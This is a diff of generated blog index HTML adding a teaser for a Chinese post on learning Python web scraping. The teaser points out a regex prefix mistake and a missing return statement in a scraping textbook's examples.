-              <a class="btn" href="/posts/8cd80461/#more" rel="contents">
+              <a class="btn" href="/posts/46708f4d/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+    <div>
+      
+    </div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/posts/3e78770/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/photo.jpg">
+      <meta itemprop="name" content="NoOne">
+      <meta itemprop="description" content="One people that no one know">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoOne-hub">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/3e78770/" class="post-title-link" itemprop="url">python爬虫学习1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-11-10 16:46:17" itemprop="dateModified" datetime="2019-11-10T16:46:17+08:00">2019-11-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
+                    <span itemprop="name">基础</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span id="/posts/3e78770/" class="post-meta-item leancloud_visitors" data-flag-title="python爬虫学习1" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/posts/3e78770/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/3e78770/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>3 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="爬虫第一天"><a href="#爬虫第一天" class="headerlink" title="爬虫第一天"></a>爬虫第一天</h1><h2 id="关于内容的思考"><a href="#关于内容的思考" class="headerlink" title="关于内容的思考"></a>关于内容的思考</h2><p>书里有两处遗漏</p><ol>
+<li><p>正则匹配不当</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link_craw(<span class="string">'http://example.python-scraping.com'</span>, <span class="string">'/places/default/(index|view)'</span>,user_agent=<span class="string">'BadCrawler'</span>)</span><br></pre></td></tr></table></figure>
+<p>这里应该是/place/default/这样的格式，因为re.match只匹配开头串，前面重复的部分也要写上</p>
+</li>
+<li><p>在requests这里讲解的时候代码少了个return html</p>
+</li>
+</ol>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/3e78770/#more" rel="contents">
                 Read more &raquo;
               </a>
             </div>
